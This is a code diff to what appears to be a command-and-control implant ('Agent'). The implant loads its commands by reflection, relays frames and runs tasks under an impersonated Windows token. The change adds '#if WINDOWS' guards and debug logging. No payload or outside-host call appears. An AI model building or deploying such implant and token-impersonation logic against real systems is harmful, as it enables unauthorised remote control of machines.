@@ -9,9 +9,11 @@ using System.Reflection;
 using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
-using WinAPI.DInvoke;
 using BinarySerializer;
 using System.Diagnostics;
+#if WINDOWS
+using WinAPI.DInvoke;
+#endif
 
 namespace Agent
 {
@@ -32,6 +34,7 @@ namespace Agent
 
         private List<AgentCommand> _commands = new List<AgentCommand>();
 
+#if WINDOWS
         private IntPtr _impersonationToken;
         public IntPtr ImpersonationToken
         {
@@ -45,14 +48,17 @@ namespace Agent
                 _impersonationToken = value;
             }
         }
+#endif
 
         public void LoadCommands()
         {
             var self = Assembly.GetExecutingAssembly();
+            Debug.WriteLine($"Loading commands ...");
             foreach (var type in self.GetTypes())
             {
                 if (type.IsSubclassOf(typeof(AgentCommand)) && !type.ContainsGenericParameters && !type.IsAbstract)
                 {
+                    Debug.WriteLine($"Loading command: {type.Name}");
                     var instance = Activator.CreateInstance(type) as AgentCommand;
                     _commands.Add(instance);
                 }
@@ -161,7 +167,7 @@ namespace Agent
                 {
 #if DEBUG
                     Debug.WriteLine($"No relay with ID {frame.Destination} found !");
-#endif  
+#endif
                 }
                 else
                 {
@@ -273,15 +279,17 @@ namespace Agent
 
             // add to dict
             TaskTokens.Add(task.Id, tokenSource);
-
+#if WINDOWS
             // get the current identity
             using (var identity = ImpersonationToken == IntPtr.Zero
                 ? WindowsIdentity.GetCurrent()
                 : new WindowsIdentity(ImpersonationToken))
+#endif
             {
-
+#if WINDOWS
                 // create impersonation context
                 using (var context = identity.Impersonate())
+#endif
                 {
 
                     var thread = new Thread(async () =>
